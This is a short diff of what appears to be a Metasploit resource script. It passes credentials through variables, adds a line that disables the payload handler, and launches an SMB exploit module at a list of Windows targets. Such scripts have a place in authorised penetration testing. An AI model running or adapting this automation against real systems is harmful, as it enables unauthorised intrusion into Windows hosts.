@@ -14,6 +14,7 @@ set LOCALLOCATION $Linux_FILE
 set REMOTELOCATION /tmp/logs
 set USERNAME $Linux_USERNAME
 set PASSWORD $Linux_PASSWORD
+set disablepayloadhandler true
 run
 use exploit/darkfowl_smb
 set RHOSTS $Windows_TARGETS
